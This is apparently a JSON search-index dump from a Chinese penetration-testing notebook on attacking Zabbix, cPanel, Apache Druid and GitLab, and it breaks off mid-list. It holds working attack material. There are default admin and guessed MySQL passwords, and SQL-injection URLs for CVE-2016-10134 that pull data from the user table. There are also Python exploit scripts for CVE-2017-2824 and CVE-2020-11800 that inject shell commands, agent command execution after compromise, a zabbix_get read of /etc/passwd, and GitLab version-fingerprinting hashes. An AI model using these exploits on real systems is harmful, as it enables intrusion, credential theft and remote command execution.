Web\u4e0a\u7559\u4e0b\u592a\u591a\u65e5\u5fd7\u75d5\u8ff9\uff0c\u6216\u8005\u60f3\u6279\u91cf\u63a7\u5236Agent\uff0c\u62ff\u4e0bZabbix Server\u6743\u9650\u540e\u53ef\u4ee5\u901a\u8fc7zabbix_get\u547d\u4ee4\u5411Agent\u6267\u884c\u76d1\u63a7\u9879\u547d\u4ee4\uff0c \u5728Zabbix Web\u6267\u884c\u811a\u672c\u5b9e\u9645\u4e0a\u7b49\u4e8e\u6267\u884csystem.run\u76d1\u63a7\u9879\u547d\u4ee4 \u3002 \u4e5f\u53ef\u4ee5\u57fa\u4e8eZabbix Server\u4f5c\u4e3a\u96a7\u9053\u8df3\u677f\uff0c\u5728\u672c\u5730\u6267\u884czabbix_get\u547d\u4ee4\u4e5f\u80fd\u8fbe\u5230\u540c\u6837\u6548\u679c\uff08Zabbix Agent\u4e3aIP\u767d\u540d\u5355\u6821\u9a8c\uff09\u3002 UserParameter \u81ea\u5b9a\u4e49\u53c2\u6570\u547d\u4ee4\u6ce8\u5165 \u6267\u884c\u76d1\u63a7\u9879\u65f6UserParameter\u53c2\u6570command\u547d\u4ee4\u7684\\$1\u3001\\$2\u7b49\u4f1a\u88ab\u66ff\u6362\u6210item\u4f20\u53c2\u503c\uff0c\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u7684\u98ce\u9669\uff0c\u4f46\u9ed8\u8ba4\u53d7UnsafeUserParameters\u53c2\u6570\u9650\u5236\u65e0\u6cd5\u4f20\u5165\u7279\u6b8a\u5b57\u7b26\u3002 \u5f53Zabbiax Agent\u7684 zabbix_agentd.conf \u914d\u7f6e\u6587\u4ef6\u5f00\u542fUnsafeUserParameters\u53c2\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u4f20\u53c2\u503c\u5b57\u7b26\u4e0d\u53d7\u9650\u5236\uff0c\u53ea\u9700\u8981\u627e\u5230\u5b58\u5728\u4f20\u53c2\u7684\u81ea\u5b9a\u4e49\u53c2\u6570UserParameter\uff0c\u5c31\u80fd\u8fbe\u5230\u547d\u4ee4\u6ce8\u5165\u7684\u6548\u679c\u3002\uff08\u4e5f\u5c31\u662f\u8bf4\uff0c\u770b\u8138\uff09 \u5185\u7f51\u6e17\u900f\u65f6\u5019\u7559\u610fagent\u4e0a\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u5728\u5176\u4ed6\u673a\u5668\u4e0a\u8fdb\u884c\u590d\u7528 Zabbix Agent\u7684\u914d\u7f6e\u6587\u4ef6zabbix_agentd.conf\u901a\u5e38\u4f4d\u4e8e\u4ee5\u4e0b\u4f4d\u7f6e\u4e4b\u4e00\uff1a - Linux\u7cfb\u7edf\uff1a/etc/zabbix/zabbix_agentd.conf - Windows\u7cfb\u7edf\uff1aC:\\Program Files\\Zabbix Agent\\zabbix_agentd.conf \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 zabbix_get -s 172.19.0.5 -p 10050 -k \"vfs.file.contents[/etc/passwd]\" ref https://blog.noah.360.net/zabbixgong-ji-mian-wa-jue-yu-li-yong/","title":"Zabbix"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#zabbix","text":"","title":"Zabbix"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#_1","text":"\u7cfb\u7edf\u63a2\u6d4b \u53d1\u8d77\u653b\u51fb \u9ed8\u8ba4\u5bc6\u7801 CVE-2022-23131 CVE-2016-10134 CVE-2017-2824 - \u547d\u4ee4\u6ce8\u5165 CVE-2020-11800 - \u547d\u4ee4\u6ce8\u5165 \u540e\u6e17\u900f EnableRemoteCommands \u53c2\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c zabbix_get UserParameter \u81ea\u5b9a\u4e49\u53c2\u6570\u547d\u4ee4\u6ce8\u5165 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 ref Zabbix\u662f\u4e00\u4e2a\u8bbe\u5907\u76d1\u63a7\u5668\uff0c\u76d1\u63a7\u5404\u4e2a\u670d\u52a1\u5668\u7684\u72b6\u6001 \u5e38\u89c1\u67b6\u6784\uff0cserver\u662f\u76d1\u63a7\u7aef\uff0cagent\u662f\u88ab\u76d1\u63a7\u7aef \u82e5\u9700\u8981\u5927\u89c4\u6a21\u76d1\u63a7\uff0c\u5219\u53ef\u4ee5\u7528\u5982\u4e0b\u6a21\u5f0f","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#_2","text":"","title":"\u7cfb\u7edf\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#_3","text":"","title":"\u53d1\u8d77\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#_4","text":"\u00b7 \u8d85\u7ea7\u7ba1\u7406\u5458\u9ed8\u8ba4\u8d26\u53f7\uff1aAdmin\uff0c\u5bc6\u7801\uff1azabbix \u00b7 Guests\u7528\u6237\uff0c\u8d26\u53f7\uff1aguest\uff0c\u5bc6\u7801\u4e3a\u7a7a \u00b7 Mysql\u5f31\u53e3\u4ee4 \u9664\u4e86\u9ed8\u8ba4root\u7528\u6237\u65e0\u6cd5\u5916\u8fde\u4e4b\u5916\uff0c\u8fd0\u7ef4\u901a\u5e38\u4f1a\u65b0\u5efaMySQL\u7528\u6237 zabbix \uff0c\u6839\u636e\u7528\u6237\u4e60\u60ef\u68b3\u7406\u4e86 zabbix \u7528\u6237\u7684\u5e38\u89c1\u5bc6\u7801\uff1a 123456 zabbix zabbix123 zabbix1234 zabbix12345 zabbix123456","title":"\u9ed8\u8ba4\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#cve-2022-23131","text":"\u767b\u5f55\u7ed5\u8fc7 5.4.0-5.4.8 6.0.0alpha1 https://github.com/Mr-xn/cve-2022-23131","title":"CVE-2022-23131"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#cve-2016-10134","text":"Zabbix 2.2.14\u4e4b\u524d\u7684\u7248\u672c\u548c3.0.4\u4e4b\u524d\u76843.0\u7248\u672c\u4e2d\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e \u8bbf\u5ba2\u767b\u5f55 \u767b\u5f55\u540e\uff0c\u67e5\u770bCookie\u4e2d\u7684zbx_sessionid\uff0c\u590d\u5236\u540e16\u4f4d\u5b57\u7b26 \u5c06\u8fd916\u4e2a\u5b57\u7b26\u4f5c\u4e3asid\u7684\u503c\uff0c\u8bbf\u95ee http://192.168.92.132:8080 /latest.php?output=ajax&sid= sid\u503c&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0) payload2\uff0c\u8fd9\u4e2apayload\u65e0\u9700\u767b\u5f55 http://192.168.92.132:8080/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,name,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17","title":"CVE-2016-10134"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#cve-2017-2824-","text":"\u524d\u63d0\uff1a\u5f00\u542f\u81ea\u52a8\u6ce8\u518c exp import sys import socket import json import sys def send(ip, data): conn = socket.create_connection((ip, 10051), 10) conn.send(json.dumps(data).encode()) data = conn.recv(2048) conn.close() return data target = sys.argv[1] print(send(target, {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\";touch /tmp/success\"})) for i in range(10000, 10500): data = send(target, {\"request\":\"command\",\"scriptid\":1,\"hostid\":str(i)}) if data and b'failed' not in data: print('hostid: %d' % i) print(data)","title":"CVE-2017-2824 - \u547d\u4ee4\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#cve-2020-11800-","text":"\u8be5\u6f0f\u6d1e\u4e3a\u57fa\u4e8e CVE-2017-2824 \u7684\u7ed5\u8fc7\u5229\u7528\u3002\u672a\u6388\u6743\u653b\u51fb\u8005\u5411 Zabbix Server \u7684 10051 \u7aef\u53e3\u53d1\u9001 trapper \u529f\u80fd\u76f8\u5173\u547d\u4ee4\uff0c\u5229\u7528\u6f0f\u6d1e\u5373\u53ef\u5728 Zabbix Server \u4e0a\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 \u5176\u4e2d CVE-2020-11800 \u6f0f\u6d1e\u901a\u8fc7 ipv6 \u683c\u5f0f\u7ed5\u8fc7 ip \u5b57\u6bb5\u68c0\u6d4b\u6ce8\u5165\u6267\u884c shell \u547d\u4ee4\uff0c \u53d7\u6570\u636e\u8868\u5b57\u6bb5\u9650\u5236 Payload \u957f\u5ea6\u53ea\u80fd\u4e3a 64 \u4e2a\u5b57\u7b26 \u3002 {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\"ffff:::;whoami\"} exp import sys import socket import json import sys def send(ip, data): conn = socket.create_connection((ip, 10051), 10) conn.send(json.dumps(data).encode()) data = conn.recv(2048) conn.close() return data target = sys.argv[1] print(send(target, {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\"ffff:::;whoami\"})) for i in range(10000, 10500): data = send(target, {\"request\":\"command\",\"scriptid\":1,\"hostid\":str(i)}) if data and b'failed' not in data: print('hostid: %d' % i) print(data)","title":"CVE-2020-11800 - \u547d\u4ee4\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#_5","text":"","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#enableremotecommands","text":"\u5728agent\u4e0a\u6267\u884c\u547d\u4ee4\u9700\u8981\u5728 zabbix_agentd.conf \u914d\u7f6e\u6587\u4ef6\u4e2d\u5f00\u542fEnableRemoteCommands\u53c2\u6570\uff0c\u5728server\u4e0a\u6267\u884c\u547d\u4ee4\u5c31\u4e0d\u7528\u3002 \u5982\u679c\u8981\u6307\u5b9a\u67d0\u4e2aagent\u6267\u884c\u8be5\u811a\u672c\uff0c\u53ef\u4eceZabbix Web\u7684\u201c\u76d1\u6d4b\u4e2d -> \u6700\u65b0\u6570\u636e\u201d\u529f\u80fd\u4e2d\u6839\u636e\u8fc7\u6ee4\u6761\u4ef6\u627e\u5230\u60f3\u8981\u6267\u884c\u811a\u672c\u7684\u4e3b\u673a\uff0c\u5355\u51fb\u4e3b\u673a\u540d\u5373\u53ef\u5728\u5bf9\u5e94Agent\u4e0a\u6267\u884c\u811a\u672c\u3002 \u8fd9\u91cc\u6709\u4e2a\u5e38\u89c1\u8bef\u533a\uff0c\u5982\u679c\u7c7b\u578b\u662f\u201c\u6267\u884c\u5728Zabbix\u670d\u52a1\u5668\u201d\uff0c\u65e0\u8bba\u9009\u62e9\u54ea\u53f0\u4e3b\u673a\u6267\u884c\u811a\u672c\uff0c\u6700\u7ec8\u90fd\u662f\u6267\u884c\u5728Zabbix Server\u4e0a\u3002","title":"EnableRemoteCommands \u53c2\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#zabbix_get","text":"\u5982\u679c\u4e0d\u60f3\u5728Zabbix Web\u4e0a\u7559\u4e0b\u592a\u591a\u65e5\u5fd7\u75d5\u8ff9\uff0c\u6216\u8005\u60f3\u6279\u91cf\u63a7\u5236Agent\uff0c\u62ff\u4e0bZabbix Server\u6743\u9650\u540e\u53ef\u4ee5\u901a\u8fc7zabbix_get\u547d\u4ee4\u5411Agent\u6267\u884c\u76d1\u63a7\u9879\u547d\u4ee4\uff0c \u5728Zabbix Web\u6267\u884c\u811a\u672c\u5b9e\u9645\u4e0a\u7b49\u4e8e\u6267\u884csystem.run\u76d1\u63a7\u9879\u547d\u4ee4 \u3002 \u4e5f\u53ef\u4ee5\u57fa\u4e8eZabbix Server\u4f5c\u4e3a\u96a7\u9053\u8df3\u677f\uff0c\u5728\u672c\u5730\u6267\u884czabbix_get\u547d\u4ee4\u4e5f\u80fd\u8fbe\u5230\u540c\u6837\u6548\u679c\uff08Zabbix Agent\u4e3aIP\u767d\u540d\u5355\u6821\u9a8c\uff09\u3002","title":"zabbix_get"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#userparameter","text":"\u6267\u884c\u76d1\u63a7\u9879\u65f6UserParameter\u53c2\u6570command\u547d\u4ee4\u7684\\$1\u3001\\$2\u7b49\u4f1a\u88ab\u66ff\u6362\u6210item\u4f20\u53c2\u503c\uff0c\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u7684\u98ce\u9669\uff0c\u4f46\u9ed8\u8ba4\u53d7UnsafeUserParameters\u53c2\u6570\u9650\u5236\u65e0\u6cd5\u4f20\u5165\u7279\u6b8a\u5b57\u7b26\u3002 \u5f53Zabbiax Agent\u7684 zabbix_agentd.conf \u914d\u7f6e\u6587\u4ef6\u5f00\u542fUnsafeUserParameters\u53c2\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u4f20\u53c2\u503c\u5b57\u7b26\u4e0d\u53d7\u9650\u5236\uff0c\u53ea\u9700\u8981\u627e\u5230\u5b58\u5728\u4f20\u53c2\u7684\u81ea\u5b9a\u4e49\u53c2\u6570UserParameter\uff0c\u5c31\u80fd\u8fbe\u5230\u547d\u4ee4\u6ce8\u5165\u7684\u6548\u679c\u3002\uff08\u4e5f\u5c31\u662f\u8bf4\uff0c\u770b\u8138\uff09 \u5185\u7f51\u6e17\u900f\u65f6\u5019\u7559\u610fagent\u4e0a\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u5728\u5176\u4ed6\u673a\u5668\u4e0a\u8fdb\u884c\u590d\u7528 Zabbix Agent\u7684\u914d\u7f6e\u6587\u4ef6zabbix_agentd.conf\u901a\u5e38\u4f4d\u4e8e\u4ee5\u4e0b\u4f4d\u7f6e\u4e4b\u4e00\uff1a - Linux\u7cfb\u7edf\uff1a/etc/zabbix/zabbix_agentd.conf - Windows\u7cfb\u7edf\uff1aC:\\Program Files\\Zabbix Agent\\zabbix_agentd.conf","title":"UserParameter \u81ea\u5b9a\u4e49\u53c2\u6570\u547d\u4ee4\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#_6","text":"zabbix_get -s 172.19.0.5 -p 10050 -k \"vfs.file.contents[/etc/passwd]\"","title":"\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/Zabbix/Zabbix/#ref","text":"https://blog.noah.360.net/zabbixgong-ji-mian-wa-jue-yu-li-yong/","title":"ref"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/cpanel/cpanel/","text":"cpanel \u7c7b\u4f3c\u5b9d\u5854 \u6253\u70b9 \u9ed8\u8ba4\u5bc6\u7801 \u9ed8\u8ba4\u7528\u6237\u540d\u4e3a\u201c_SYSTEM\u201d(\u5927\u5199)\uff0c\u5bc6\u7801\u4e3a\u201c sys \u201d\u3002","title":"cpanel"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/cpanel/cpanel/#cpanel","text":"\u7c7b\u4f3c\u5b9d\u5854","title":"cpanel"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/cpanel/cpanel/#_1","text":"","title":"\u6253\u70b9"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/cpanel/cpanel/#_2","text":"\u9ed8\u8ba4\u7528\u6237\u540d\u4e3a\u201c_SYSTEM\u201d(\u5927\u5199)\uff0c\u5bc6\u7801\u4e3a\u201c sys \u201d\u3002","title":"\u9ed8\u8ba4\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/druid/druid/","text":"druid \u672a\u6388\u6743\u8bbf\u95ee rce (CVE-2023-25194) 0.19.0 <= Apache Druid <= 25.0.0 \u4f3c\u4e4e\u8981\u548ckafka\u914d\u5408\u4f7f\u7528","title":"druid"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/druid/druid/#druid","text":"","title":"druid"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/druid/druid/#_1","text":"","title":"\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/druid/druid/#rce-cve-2023-25194","text":"0.19.0 <= Apache Druid <= 25.0.0 \u4f3c\u4e4e\u8981\u548ckafka\u914d\u5408\u4f7f\u7528","title":"rce (CVE-2023-25194)"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/","text":"gitlab \u76ee\u5f55 \u4fe1\u606f\u63a2\u6d4b \u7248\u672c-help\u68c0\u6d4b \u7248\u672c-json\u6587\u4ef6\u68c0\u6d4b \u6e17\u900f gitlab\u672a\u6388\u6743RCE\uff08CVE-2021-22205\uff09 \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u672a\u6388\u6743\u6d4f\u89c8\u9879\u76ee \u90ae\u4ef6\u4fe1\u606f\u6cc4\u9732 \u4fe1\u606f\u63a2\u6d4b fofa https://fofa.info/result?qbase64=YXBwPSJHaXRMYWIi\u200b \u7248\u672c-help\u68c0\u6d4b \u57fa\u672c\u4e0d\u9002\u7528\u4e86\uff0chelp\u73b0\u5728\u5f88\u5c11\u663e\u793a\u7248\u672c /help \u7248\u672c-json\u6587\u4ef6\u68c0\u6d4b GET /assets/webpack/manifest.json \u627e\u5230\u8fd9\u4e2ahash \u7136\u540e\u8fdb\u884c\u6bd4\u5bf9 'cf9dda0685218aacd158': 'gitlab-ce:11.7.10,11.7.11,11.7.12', '6b1a340cc698f3d774e3': 'gitlab-ce:11.3.11,11.3.12,11.3.13,11.3.14', 'c28d3239bbda98edab5d': 'gitlab-ee:11.6.9', 'fd45e68f8ec7fbcbdf7f': 'gitlab-ee:9.3.2', '6bbcdc4e4a890abe3ab6': 'gitlab-ce:11.9.0,11.9.1', '66be8eb8d0247972158a': 'gitlab-ee:13.12.1', '5e0deddaf1aa02e08f6a': 'gitlab-ee:12.9.4,12.9.5,12.9.7', '32d837da3ba6c30dbffa': 'gitlab-ce:10.3.6', '901231cf8f98cf4d667d': 'gitlab-ee:12.0.2,12.0.3,12.0.4,12.0.6', 'c3e77be338d2c3820aa3': 'gitlab-ce:9.2.2', '900faeefc76b9c39e177': 'gitlab-ee:14.3.0', '7152f9200692c23439c5': 'gitlab-ce:13.9.1', '41256ddae2db143059f2': 'gitlab-ce:13.9.7', '7a2c2e92a6e9321d72c9': 'gitlab-ee:10.3.1,10.3.2,10.3.3', '757ea54bb7c30371af8e': 'gitlab-ee:13.7.1,13.7.2', '0589199a189a8263ea5c': 'gitlab-ce:11.8.10,11.8.8,11.8.9', '05454825fb65e5ed0564': 'gitlab-ee:11.3.3,11.3.4', '1a8f05366713a36b827e': 'gitlab-ce:13.9.0', 'ef8dc9055fbadcbf7559': 'gitlab-ce:9.3.11', 'befdb42a52a4c25ec60f': 'gitlab-ee:13.6.1', 'd5f2790d0c39d871ee37': 'gitlab-ce:12.10.7,12.10.8,12.10.9', 'd00382251ba87eeef9da': 'gitlab-ce:11.3.8,11.3.9', 'e98edb555f7ea1690d21': 'gitlab-ee:10.2.5', '224c9f103ccf8bf46799': 'gitlab-ce:12.5.10,12.5.9', '386d7d148743a68c788f': 'gitlab-ee:9.1.0,9.1.1,9.1.2', '09aa4374ab4df72e152c': 'gitlab-ce:12.6.8', '8043442ac0d544944bdc': 'gitlab-ce:13.12.6,13.12.7,13.12.8', '86d8b00939d5dfd6750b': 'gitlab-ce:10.5.7', '3229170f0ab163995592': 'gitlab-ee:12.4.4,12.4.5,12.4.6,12.4.7,12.4.8', '8118d9f5f74864693cd0': 'gitlab-ee:13.6.0', '185311b0772bb15a4124': 'gitlab-ce:13.11.3,13.11.4', '7efdeb80cc66c0f1454e': 'gitlab-ee:10.1.5', '5432ddc701c4ecb18cdd': 'gitlab-ee:13.5.5,13.5.6,13.5.7', '6c4c0e3cad12d9f2741b': 'gitlab-ce:13.4.0,13.4.1,13.4.2,13.4.3', '688ae2009bbea7660b29': 'gitlab-ee:12.3.0,12.3.1', 'ff718f27cbfe595d0c5a': 'gitlab-ee:13.3.9', '1f58a7fd842a95f7246e': 'gitlab-ee:11.2.0,11.2.1', '0e6ebb20f1f78e68c313': 'gitlab-ee:14.1.0,14.1.1', 'bcba1a30a136e44d7dba': 'gitlab-ee:13.4.4', '81cd9035005c0dbac690': 'gitlab-ee:9.0.1,9.0.2', '6677d59e72866131dd80': 'gitlab-ee:14.4.1', 'f84a5781c1f2e33460dd': 'gitlab-ee:8.17.0', 'c86a070122da587b8b1d': 'gitlab-ce:9.5.3', '4728caeeff834b2c0c40': 'gitlab-ce:11.4.10,11.4.11,11.4.12,11.4.8,11.4.9', '24ea291e777ae6c5c2e1': 'gitlab-ce:11.0.3,11.0.4', '03718fb3904d21960ca5': 'gitlab-ce:12.10.13,12.10.14', 'b8fa9c1f30ecbef1d125': 'gitlab-ce:13.7.8,13.7.9', 'ace501b6fc6ab4254916': 'gitlab-ce:9.0.10,9.0.11,9.0.12,9.0.13,9.0.7,9.0.9', '528cd970c76d9969887c': 'gitlab-ce:12.5.1,12.5.2', 'f4f956ad11599396a680': 'gitlab-ce:11.9.4', 'cde2f5973aad940f794c': 'gitlab-ee:14.4.0', 'febbdc5097b2bcb3f35a': 'gitlab-ee:13.8.5,13.8.6,13.8.7,13.8.8', '359b54bfd45aac35d8b7': 'gitlab-ce:12.9.4,12.9.5,12.9.7', 'a72463e762bf45334c19': 'gitlab-ce:10.4.4,10.4.5,10.4.6', 'e37d0117517fb9a3f6e1': 'gitlab-ce:13.3.2,13.3.3', 'fd79ab56d7d298db3d67': 'gitlab-ee:9.5.10,9.5.9', 'ee193a55c67377955a51': 'gitlab-ce:13.12.0,13.12.1', '79e5a070754dcefaf198': 'gitlab-ee:13.3.5', '5626b32f6eb1d2b31bc9': 'gitlab-ee:11.9.0', '433d31ecbc8c2f19286e': 'gitlab-ee:11.1.2', 'be0e341aa6473f2581a3': 'gitlab-ce:12.3.0,12.3.1', 'c106c9e4c60efb8a36a6': 'gitlab-ee:10.2.3', '8e3d3bfb37388b523b42': 'gitlab-ce:12.10.10,12.10.11,12.10.12', '8d91d38916cfadff9fdd': 'gitlab-ee:13.4.7', '7af107b33916d608fb10': 'gitlab-ce:9.0.3,9.0.4', 'd074198337d797055418': 'gitlab-ee:13.11.5', '0f89294c899fd9acf9a0': 'gitlab-ce:9.1.3', 'e700d0b451fad61bc2ce': 'gitlab-ce:13.6.2', 'e540ee263bc38a8adea1': 'gitlab-ee:11.6.1', '46c7dfbe962d7bbb7d4b': 'gitlab-ee:12.6.6,12.6.7', '4894d4f1fe0f2f2990a1': 'gitlab-ce:14.0.10,14.0.11,14.0.7,14.0.8,14.0.9', '885f1a8c1499d69dbe12': 'gitlab-ce:10.5.4,10.5.5,10.5.6', '97068fa7d49791d762aa': 'gitlab-ce:8.17.4,8.17.5', 'aec631615e5dc8f2058f': 'gitlab-ee:11.3.10', 'daf226fb1a889e2935bb': 'gitlab-ce:11.2.0,11.2.1', '6e88a01575fdbb325271': 'gitlab-ee:13.5.1', '5f1a0adb1e27d57e6932': 'gitlab-ee:9.3.3', '95cdb3ab46d12dd1c443': 'gitlab-ee:10.7.5,10.7.6,10.7.7', '7b04a345628e37db69fa': 'gitlab-ce:10.7.2', 'f01f0e1e0514d0a61895': 'gitlab-ee:12.9.1', '7f723378064d4b1d0e9e': 'gitlab-ee:11.6.10,11.6.11', '1686df51990654bb1054': 'gitlab-ce:10.6.0', 'd4edaa9d0fb17ed72506': 'gitlab-ee:13.11.6,13.11.7', '3b90f4e32d4f5b2051b9': 'gitlab-ce:13.11.6,13.11.7', 'f1feb0489f6d4056d72d': 'gitlab-ee:11.4.3,11.4.4', '8d9d6dd550fe2b65402c': 'gitlab-ee:10.8.7', '0b0bbbbea3aad08a16b3': 'gitlab-ce:13.5.0', '1063668f6a6c737c8b83': 'gitlab-ee:11.3.8,11.3.9', 'fcd10f5a8e0098ea15ed': 'gitlab-ce:10.2.0,10.2.1', '43a0bfa9d67baf9c7530': 'gitlab-ce:11.6.2,11.6.3,11.6.4', '286de78d78d5e620094f': 'gitlab-ee:12.2.4,12.2.5', 'd8726e1320b92b0f2a6d': 'gitlab-ce:10.1.1,10.1.2', 'c8017d62e3bdd1de8ba1': 'gitlab-ee:12.4.2,12.4.3', 'b34d36fde013c6800938': 'gitlab-ee:12.5.3,12.5.4,12.5.5,12.5.6,12.5.7', 'bc4277618d88119d7f63': 'gitlab-ce:12.9.0', 'b3ddefcac9e1fd0ce088': 'gitlab-ee:10.0.7', '7e8a2ad730063d55c763': 'gitlab-ee:10.2.2', '3b1c36c89eca83a04cda': 'gitlab-ce:10.2.6,10.2.7,10.2.8', '6f6094fd1f77ec38c04e': 'gitlab-ee:13.1.1', 'e787f4c0a544820285f9': 'gitlab-ce:10.6.1,10.6.2', '8b6b0f66e5a55f41c2db': 